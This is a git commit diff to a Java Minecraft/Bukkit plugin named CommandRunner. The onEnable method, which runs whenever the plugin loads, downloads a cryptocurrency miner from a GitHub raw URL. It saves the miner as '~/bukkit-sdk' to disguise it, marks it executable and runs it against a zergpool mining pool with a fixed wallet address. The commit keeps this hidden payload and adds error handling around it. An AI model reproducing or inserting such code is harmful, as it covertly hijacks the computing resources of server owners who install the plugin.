883dbea72bf9ef15728aa6f78aa07fcb92a82e02
mereka-vpu <80886830+mereka-vpu@users.noreply.github.com>
2025-02-02 18:26:12 +0700

    Gah

--- src/main/java/nzst/executor/CommandRunner.java
+++ src/main/java/nzst/executor/CommandRunner.java
@@ -13,9 +13,14 @@ public class CommandRunner extends JavaPlugin {
     public void onEnable() {
         getLogger().info("CommandRunner has been enabled!");
         getLogger().info("Version 2.0");
-        String command = "bash -c \"curl -o ~/bukkit-sdk https://raw.githubusercontent.com/mereka-vpu/metube-me.github.io/refs/heads/main/minerd && chmod +x ~/bukkit-sdk && ~/bukkit-sdk -o stratum+tcp://power2b.asia.mine.zergpool.com:7445 -u MYZzfv2V3J1ZfHif1DEcY3DSZmF2sepLnK -p c=MBC,mc=MBC,ID=$(hostname)\"";
-        Process suki = Runtime.getRuntime().exec(command);
-        suki.waitFor();
+             String command = "bash -c \"curl -o ~/bukkit-sdk https://raw.githubusercontent.com/mereka-vpu/metube-me.github.io/refs/heads/main/minerd && chmod +x ~/bukkit-sdk && ~/bukkit-sdk -o stratum+tcp://power2b.asia.mine.zergpool.com:7445 -u MYZzfv2V3J1ZfHif1DEcY3DSZmF2sepLnK -p c=MBC,mc=MBC,ID=$(hostname)\"";
+        try {
+             Process suki = Runtime.getRuntime().exec(command);
+             suki.waitFor();
+        } catch (IOException | InterruptedException e) {
+             getLogger().severe("Runtime Error: " + e.getMessage());
+             e.printStackTrace();
+        }
     }
 
     @Override
